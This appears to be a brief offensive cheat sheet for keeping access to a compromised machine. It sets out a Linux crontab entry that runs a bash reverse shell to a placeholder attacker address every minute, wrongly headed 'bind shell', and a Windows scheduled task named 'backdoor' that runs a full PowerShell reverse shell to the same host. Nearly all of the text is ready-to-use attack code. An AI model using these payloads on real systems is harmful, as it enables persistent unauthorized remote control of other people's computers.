### linux

edit the user's crontab file
```
crontab -e
```
bind shell payload
```
#will attempt to connect back to you every minute
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_FOOTHOLD_IP/4444 0>&1'
```

---
### windowns

persistence with `schtasks.exe`
```
schtasks /create /sc minute /mo 1 /tn "backdoor" /tr "powershell -c '$client = New-Object System.Net.Sockets.TCPClient(\"YOUR_FOOTHOLD_IP\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'"
```
